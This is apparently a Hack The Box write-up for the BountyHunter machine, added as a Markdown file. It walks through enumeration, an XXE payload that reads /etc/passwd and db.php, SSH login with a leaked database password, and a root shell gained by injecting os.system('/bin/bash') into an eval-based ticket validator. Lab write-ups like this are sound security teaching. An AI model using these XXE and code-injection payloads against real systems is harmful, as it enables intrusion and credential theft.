@@ -1,0 +1,305 @@
+---
+title: BountyHunter Writeup - Hack The Box
+description: Performing XXE injection on the BountyHunter machine on Hack The Box.
+author: Nontas Bakoulas
+date: 2025-10-02
+category: HTB Machines
+reading_time: 15
+---
+
+## Enumeration
+We start with an `nmap` scan:
+```console title="Nmap scan"
+nontas@local$ sudo nmap -sV -sC 10.129.95.166
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-02 12:50 EEST
+Nmap scan report for 10.129.95.166
+Host is up (0.052s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d44cf5799a79a3b0f1662552c9531fe1 (RSA)
+|   256 a21e67618d2f7a37a7ba3b5108e889a6 (ECDSA)
+|_  256 a57516d96958504a14117a42c1b62344 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Bounty Hunters
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.77 seconds
+```
+
+There's a web server running on port `80`: ![Web server](/images/blog/bountyhunter/20251002135736.png)
+
+Fuzz directories:
+```console title="Directory fuzzing"
+nontas@local$ ffuf -w /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.129.95.166:80/FUZZ -ic
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.95.166:80/FUZZ
+ :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+resources               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 81ms]
+assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 53ms]
+css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 54ms]
+js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 70ms]
+                        [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 4265ms]
+                        [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 87ms]
+:: Progress: [87651/87651] :: Job [1/1] :: 30 req/sec :: Duration: [0:05:31] :: Errors: 0 ::
+```
+We get a `403 Forbidden` response for `/assets/`, `/css/` and `/js/`.
+
+<Callout title="Alternative tools" type="info">
+You can also use `gobuster` and a better wordlist like so:
+```bash
+gobuster dir -w /opt/lists/seclists/Discovery/Web-Content/raft-small-words.txt -x php -o gobuster.out -u http://10.129.95.166/
+```
+or `dirsearch`:
+```bash
+dirsearch -u http://10.129.95.166/
+```
+</Callout>
+
+`/resources` is accessible: ![Resources directory](/images/blog/bountyhunter/20251002135635.png)
+
+Path `/resources/bountylog.js` shows the following code:
+```js
+function returnSecret(data) {
+	return Promise.resolve($.ajax({
+            type: "POST",
+            data: {"data":data},
+            url: "tracker_diRbPr00f314.php"
+            }));
+}
+
+async function bountySubmit() {
+	try {
+		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
+		<bugreport>
+		<title>${$('#exploitTitle').val()}</title>
+		<cwe>${$('#cwe').val()}</cwe>
+		<cvss>${$('#cvss').val()}</cvss>
+		<reward>${$('#reward').val()}</reward>
+		</bugreport>`
+		let data = await returnSecret(btoa(xml));
+  		$("#return").html(data)
+	}
+	catch(error) {
+		console.log('Error:', error);
+	}
+}
+```
+
+Also fuzz `.php` files on the root:
+```console title="PHP file fuzzing"
+nontas@local$ ffuf -w /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.129.95.166:80/FUZZ.php -ic
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.95.166:80/FUZZ.php
+ :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+index                   [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 57ms]
+                        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 61ms]
+portal                  [Status: 200, Size: 125, Words: 11, Lines: 6, Duration: 54ms]
+db                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 605ms]
+                        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 92ms]
+```
+the file `db.php` looks interesting.
+
+The "Contact Us" form doesn't make any POST requests so we can ignore it.
+
+## Foothold
+
+The "Portal" button at the top right takes us first to `/portal.php` ![Portal page](/images/blog/bountyhunter/20251002132100.png)
+clicking _here_ takes us to `/log_submit.php` ![Log submit page](/images/blog/bountyhunter/20251002132136.png)
+
+Making a report and submitting it makes the following POST request `/tracker_diRbPr00f314.php`: ![POST request](/images/blog/bountyhunter/20251002132814.png)
+The value of the `data` parameter is base64 encoded and URL encoded (contains `%2B` for the `+` signs). 
+
+To decode it, we'll create a simple workflow in Caido: ![Caido workflow](/images/blog/bountyhunter/20251002141715.png)
+
+### XXE Vulnerability
+We will try and perform an XXE injection by modifying the payload that is being sent.
+```xml
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE email [
+  <!ENTITY injection SYSTEM "file:///etc/passwd">
+]>
+		<bugreport>
+		<title>&injection;</title>
+		<cwe>12978</cwe>
+		<cvss>7.9</cvss>
+		<reward>5000</reward>
+		</bugreport>
+```
+
+We now need to perform base64 + url encoding: ![Encoding workflow](/images/blog/bountyhunter/20251002171554.png)
+
+Using the repeater, we confirm the XXE vulnerability: ![XXE confirmation](/images/blog/bountyhunter/20251002171721.png)
+
+We should base64 the `php` files if we want to read them, like so:
+```xml
+<!DOCTYPE email [
+  <!ENTITY injection SYSTEM "php://filter/convert.base64-encode/resource=db.php">
+]>
+```
+
+so if we decode the base64 output, we'll read the `db.php` file:
+```php
+<?php
+// TODO -> Implement login system with the database.
+$dbserver = "localhost";
+$dbname = "bounty";
+$dbusername = "admin";
+$dbpassword = "m19RoAU0hP41A1sTsq6K";
+$testuser = "test";
+?>
+```
+
+We need a valid user on the remote to ssh into it. The `/etc/passwd` file shows 2 possible users that have `/bin/bash` as their default terminal:
+- `root`
+- `development`
+
+<Callout title="Finding valid users" type="info">Use `cat passwd | grep sh$` to find valid users.</Callout>
+
+To test the password for each user:
+```console title="Password testing"
+nontas@local$ netexec ssh 10.129.95.166 -u users.txt -p 'm19RoAU0hP41A1sTsq6K'
+SSH         10.129.95.166   22     10.129.95.166    [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
+SSH         10.129.95.166   22     10.129.95.166    [-] root:m19RoAU0hP41A1sTsq6K
+SSH         10.129.95.166   22     10.129.95.166    [+] development:m19RoAU0hP41A1sTsq6K (admin) Linux - Shell access!
+```
+
+so now we can SSH:
+```console
+nontas@local$ ssh development@10.129.95.166
+```
+
+and we find the `user.txt` flag:
+```console
+development@bountyhunter:~$ ls
+contract.txt  user.txt
+```
+
+## Privilege Escalation
+
+Let's list our sudo privileges:
+```console title="Sudo privileges"
+development@bountyhunter:~$ sudo -l
+Matching Defaults entries for development on bountyhunter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User development may run the following commands on bountyhunter:
+    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+```
+seems like we can run `/opt/skytrain_inc/ticketValidator.py` as sudo.
+
+It contains the following source code:
+```python
+#Skytrain Inc Ticket Validation System 0.1
+#Do not distribute this file.
+
+def load_file(loc):
+    if loc.endswith(".md"):
+        return open(loc, 'r')
+    else:
+        print("Wrong file type.")
+        exit()
+
+def evaluate(ticketFile):
+    #Evaluates a ticket to check for ireggularities.
+    code_line = None
+    for i,x in enumerate(ticketFile.readlines()):
+        if i == 0:
+            if not x.startswith("# Skytrain Inc"):
+                return False
+            continue
+        if i == 1:
+            if not x.startswith("## Ticket to "):
+                return False
+            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
+            continue
+
+        if x.startswith("__Ticket Code:__"):
+            code_line = i+1
+            continue
+
+        if code_line and i == code_line:
+            if not x.startswith("**"):
+                return False
+            ticketCode = x.replace("**", "").split("+")[0]
+            if int(ticketCode) % 7 == 4:
+                validationNumber = eval(x.replace("**", ""))
+                if validationNumber > 100:
+                    return True
+                else:
+                    return False
+    return False
+
+def main():
+    fileName = input("Please enter the path to the ticket file.\n")
+    ticket = load_file(fileName)
+    #DEBUG print(ticket)
+    result = evaluate(ticket)
+    if (result):
+        print("Valid ticket.")
+    else:
+        print("Invalid ticket.")
+    ticket.close
+
+main()
+```
+our goal here is to create a valid `.md` file so we can exploit the `eval` function.
+
+One possible file is the following:
+```txt
+# Skytrain Inc
+## Ticket to 
+__Ticket Code:__
+**11+ 100 == 111 and __import__("os").system("/bin/bash") == True
+```
+since the python file is going to be run as root, the spawned shell will be a root shell as well.
+
+Finally, we can get access to the root flag:
+```console title="Getting root"
+development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+Please enter the path to the ticket file.
+ticket.md
+Destination: 
+root@bountyhunter:/home/development# cd ~
+root@bountyhunter:~# ls
+root.txt  snap
+```
